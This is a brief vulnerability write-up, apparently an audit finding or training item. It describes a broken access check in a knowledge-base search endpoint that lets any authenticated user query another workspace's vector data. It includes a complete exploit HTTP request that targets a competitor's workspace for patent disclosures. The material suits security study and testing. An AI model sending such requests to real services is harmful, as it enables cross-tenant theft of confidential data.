diagnosis: The Qdrant knowledge base search route accepts a workspaceId directly in the request body and executes a vector similarity search filtering on that workspace_id. Although the user has a valid authenticated session, the endpoint fails to verify that req.user is a permitted member of workspaceId. An attacker can set workspaceId to any target organization's ID and retrieve their vector embeddings and document payloads.
exploit_request:
POST /api/knowledge-base/search HTTP/1.1
Host: kb-search.saas.com
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json

{
  "workspaceId": "ws_stealth_competitor_8810",
  "query": "intellectual property patent disclosures"
}
